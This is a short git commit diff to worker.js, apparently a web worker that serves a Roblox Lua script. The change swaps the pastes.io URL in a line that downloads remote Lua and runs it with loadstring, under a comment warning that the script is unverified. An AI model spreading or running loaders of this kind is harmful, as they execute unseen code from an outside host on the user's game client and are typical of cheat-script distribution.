94ce0d02605018aca461b139271e2bcfcab0978f
Hiplitehehe <hiplitehehe@gmail.com>
2025-03-22 13:39:12 +0800

    Update worker.js

--- worker.js
+++ worker.js
@@ -57,7 +57,7 @@ async function handleRequest(request) {
 --[[
   WARNING: Heads up! This script has not been verified by ScriptBlox. Use at your own risk!
 ]]
-loadstring(game:HttpGet("https://pastes.io/raw/djjdjd-570"))()
+loadstring(game:HttpGet("https://pastes.io/raw/a-23283-23"))()
 `;
 
   // Respond with the Roblox Lua script
